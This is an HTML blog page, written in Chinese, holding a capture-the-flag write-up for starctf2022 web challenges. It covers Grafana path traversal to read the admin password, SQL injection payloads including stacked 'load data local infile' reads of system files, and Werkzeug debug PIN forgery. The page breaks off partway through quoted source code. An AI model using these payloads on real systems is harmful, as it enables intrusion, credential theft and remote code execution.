@@ -1,0 +1,821 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>starctf2022 | Err0r</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"云游君的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Err0r" type="application/atom+xml"><meta name="description" content="感觉挺有趣的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="starctf2022">
+<meta property="og:url" content="https://err0r.top/article/starctf2022/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="感觉挺有趣的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600359.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600439.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125559937.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600008.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/image-20220421133739605.png">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125559691.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600275.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125559899.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125601129.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600612.(null)">
+<meta property="og:image" content="https://err0r.top/article/starctf2022/(null)-20220421125559634.(null)">
+<meta property="article:published_time" content="2022-04-21T04:54:02.000Z">
+<meta property="article:modified_time" content="2022-04-21T05:48:02.967Z">
+<meta property="article:author" content="Err0r">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://err0r.top/article/starctf2022/(null)-20220421125600359.(null)"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/yun.png" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0r</a><sub class="site-subtitle">gyy</sub><div class="site-description">gugugu</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">Web：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-grafana"><span class="toc-number">1.1.</span> <span class="toc-text">oh-my-grafana</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-notepro"><span class="toc-number">1.2.</span> <span class="toc-text">oh-my-notepro</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#username"><span class="toc-number">1.2.1.</span> <span class="toc-text">username</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#modname"><span class="toc-number">1.2.2.</span> <span class="toc-text">modname</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattr-app-%E2%80%9Cname%E2%80%9C-type-app-name"><span class="toc-number">1.2.3.</span> <span class="toc-text">getattr(app, “name“, type(app).name)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getattr-mod-%E2%80%9Cfile%E2%80%9C-None"><span class="toc-number">1.2.4.</span> <span class="toc-text">getattr(mod, “file“, None)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#str-uuid-getnode"><span class="toc-number">1.2.5.</span> <span class="toc-text">str(uuid.getnode())</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-machine-id"><span class="toc-number">1.2.6.</span> <span class="toc-text">get_machine_id()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%BA%86%E4%B8%80%E9%94%AE%E6%9E%84%E9%80%A0%E8%84%9A%E6%9C%AC%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.7.</span> <span class="toc-text">写了一键构造脚本如下</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oh-my-lotto"><span class="toc-number">1.3.</span> <span class="toc-text">oh-my-lotto</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/starctf2022/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0r"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">starctf2022</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-04-21 12:54:02" itemprop="dateCreated datePublished" datetime="2022-04-21T12:54:02+08:00">2022-04-21</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>感觉挺有趣的</p>
+<span id="more"></span>
+
+<h1 id="Web："><a href="#Web：" class="headerlink" title="Web："></a>Web：</h1><h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>上来先搜grafana历史漏洞，果然根据版本号可以找到 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798">CVE-2021-43798</a> 进行目录穿越读文件。下载现成的 <a target="_blank" rel="noopener" href="https://dl.packetstormsecurity.net/2112-exploits/grafana830-traversal.txt">POC</a> 把插件排除一下可以查出默认的用户名密码。</p>
+<img src="/article/starctf2022/(null)-20220421125600359.(null)" class="" title="img" loading="lazy">
+
+<p>通过目录穿越读文件，即可以直接找<code>/etc/grafana/grafana.ini</code>，里面<code>admin_password</code>明文密码</p>
+<p>使用用户名密码登录上系统，可以发现在 Data Source 处有 MySQL 数据库。从 Explore 功能里构造 time 写语句即可查出 flag。</p>
+<img src="/article/starctf2022/(null)-20220421125600439.(null)" class="" title="img" loading="lazy">
+
+<pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(tablE_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.tablEs&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre>
+
+<img src="/article/starctf2022/(null)-20220421125559937.(null)" class="" title="img" loading="lazy">
+
+<pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(column_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.columns&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre>
+
+<img src="/article/starctf2022/(null)" class="" title="img" loading="lazy">
+
+<pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;flag, 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;fffffflllllllllaaaagggggg</code></pre>
+
+<p>其实直接看历史就有<code>fffffflllllllllaaaagggggg</code>这个表的查询记录，直接select就行</p>
+<hr>
+<h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>打开题目正常逻辑流程走一遍，发现写的note会过段时间(1-3s)被修改为‘Hacked by fmyy’，过了几个小时询问出题人发现此不是题目所为，很破坏体验，在无意义的项目上折腾浪费了很长时间。</p>
+<p>根据<code>/view</code>路由报错获取部分源码，看不到 sql 构造，知道开启了flask debug mode</p>
+<pre class="language-Python" data-language="Python"><code class="language-Python">@login_required
+
+def view():
+
+    note_id &#x3D; request.args.get(&quot;note_id&quot;)
+
+    sql &#x3D; f&quot;select * from notes where note_id&#x3D;&#39;&#123;note_id&#125;&#39;&quot;
+
+    print(sql)
+
+    result &#x3D; db.session.execute(sql, params&#x3D;&#123;&quot;multi&quot;: True&#125;)
+
+    db.session.commit()
+
+
+
+    result &#x3D; result.fetchone()
+
+    data &#x3D; &#123;
+
+        &#39;title&#39;: result[4],
+
+        &#39;text&#39;: result[3],
+
+    &#125;
+
+    return render_template(&#39;note.html&#39;, data&#x3D;data)</code></pre>
+
+<p>但是报错右侧有console小标，猜测一手：flask PIN码伪造，猜对了</p>
+<p><code>/view</code>处参数<code>note_id</code>可以直接注入，有明文报错</p>
+<img src="/article/starctf2022/(null)-20220421125600008.(null)" class="" title="img" loading="lazy">
+
+<p>根据爆的表发现其他选手都在爆machineid和cgroup，更加确定是flask PIN码伪造，读取了报错内容里flask生成PIN码的关键逻辑</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
+    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
+<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
+    code and a random key.  The hope is that this is stable between
+    restarts to not make debugging particularly frustrating.  If the pin
+    was forcefully disabled this returns `None`.
+
+    Second item in the resulting tuple is the cookie name for remembering.
+    """</span>
+    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
+    rv <span class="token operator">=</span> <span class="token boolean">None</span>
+    num <span class="token operator">=</span> <span class="token boolean">None</span>
+
+    <span class="token comment"># Pin was explicitly disabled</span>
+    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>
+
+    <span class="token comment"># Pin was provided explicitly</span>
+    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># If there are separators in the pin, return it directly</span>
+        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> pin
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            num <span class="token operator">=</span> pin
+
+    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
+    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>
+        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>
+        <span class="token comment"># have a username, such as in Docker.</span>
+        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        username <span class="token operator">=</span> <span class="token boolean">None</span>
+
+    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>
+
+    <span class="token comment"># This information only exists to make the cookie unique on the</span>
+    <span class="token comment"># computer, not as a security feature.</span>
+    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+        username<span class="token punctuation">,</span>
+        modname<span class="token punctuation">,</span>
+        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span>
+
+    <span class="token comment"># This information is here to make it harder for an attacker to</span>
+    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
+    <span class="token comment"># within the unauthenticated debug page.</span>
+    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>
+
+    cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+    <span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
+    <span class="token comment"># end up with the same value and generate out 9 digits</span>
+    <span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
+        num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+    <span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
+    <span class="token comment"># we don't have a result yet.</span>
+    <span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
+                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+                    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
+                <span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> num
+
+    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre>
+
+<p>可以明白rv就是最后生成的PIN码，生成PIN需要几个关键变量，</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+  	<span class="token comment"># This information only exists to make the cookie unique on the</span>
+    <span class="token comment"># computer, not as a security feature.</span>
+    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+        username<span class="token punctuation">,</span>
+        modname<span class="token punctuation">,</span>
+        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">]</span>
+
+    <span class="token comment"># This information is here to make it harder for an attacker to</span>
+    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>
+    <span class="token comment"># within the unauthenticated debug page.</span>
+    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
+
+<p>即<code>username</code>,<code>modname</code>,<code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>,<code>getattr(mod, &quot;__file__&quot;, None)</code>,<code>str(uuid.getnode())</code>和<code>get_machine_id()</code></p>
+<h3 id="username"><a href="#username" class="headerlink" title="username"></a>username</h3><p>根据报错可知，启动用户为<code>ctf</code>，即<code>username</code>为<code>ctf</code></p>
+<h3 id="modname"><a href="#modname" class="headerlink" title="modname"></a>modname</h3><p>modname也是根据报错得知为<code>flask.app</code>，默认也是</p>
+<h3 id="getattr-app-“name“-type-app-name"><a href="#getattr-app-“name“-type-app-name" class="headerlink" title="getattr(app, “name“, type(app).name)"></a>getattr(app, “<strong>name</strong>“, type(app).<strong>name</strong>)</h3><p><code>getattr(app, &quot;__name__&quot;, type(app).__name__)</code>默认为Flask</p>
+<h3 id="getattr-mod-“file“-None"><a href="#getattr-mod-“file“-None" class="headerlink" title="getattr(mod, “file“, None)"></a>getattr(mod, “<strong>file</strong>“, None)</h3><p><code>getattr(mod, &quot;__file__&quot;, None)</code>在报错界面可知为<code>/usr/local/lib/python3.8/site-packages/flask/app.py</code></p>
+<h3 id="str-uuid-getnode"><a href="#str-uuid-getnode" class="headerlink" title="str(uuid.getnode())"></a>str(uuid.getnode())</h3><p>靶机此值每次重置都会变化</p>
+<p><code>str(uuid.getnode())</code>即为靶机网卡MAC地址的十进制，利用堆叠注入，读入文件<code>-1&#39;;create table &#123;tablename&#125;(cmd text);load data local infile &#39;&#123;file&#125;&#39; into table &#123;tablename&#125; fields terminated by &#39;\\n&#39;;%23</code>(此处用load_file好像不可以)</p>
+<p>然后用联合查询<code>0&#39; union select 1,2,3,4,(select group_concat(concat_ws(0x7e,cmd)) from &#123;tablename&#125;)%23</code>从主页上读取信息</p>
+<p>读取了<code>/sys/class/net/eth0/address</code>，用python <code>str(int(MAC.decode().replace(&quot;:&quot;, &quot;&quot;), 16))</code>处理为十进制</p>
+<h3 id="get-machine-id"><a href="#get-machine-id" class="headerlink" title="get_machine_id()"></a>get_machine_id()</h3><p>靶机此值每次重置都会变化</p>
+<p>最后就剩<code>get_machine_id()</code>，网上文章众说纷纭，因为flask更新过这边的生成逻辑，这里不举例了，读了<code>__init__.py</code>直接对着题目分析代码</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> _machine_id
+
+    <span class="token keyword">if</span> _machine_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> _machine_id
+
+    <span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        linux <span class="token operator">=</span> <span class="token string">b""</span>
+
+        <span class="token comment"># machine-id is stable across boots, boot_id is not.</span>
+        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">"/etc/machine-id"</span><span class="token punctuation">,</span> <span class="token string">"/proc/sys/kernel/random/boot_id"</span><span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+                    value <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">except</span> OSError<span class="token punctuation">:</span>
+                <span class="token keyword">continue</span>
+
+            <span class="token keyword">if</span> value<span class="token punctuation">:</span>
+                linux <span class="token operator">+=</span> value
+                <span class="token keyword">break</span>
+
+        <span class="token comment"># Containers share the same machine id, add some cgroup</span>
+        <span class="token comment"># information. This is used outside containers too but should be</span>
+        <span class="token comment"># relatively stable across boots.</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
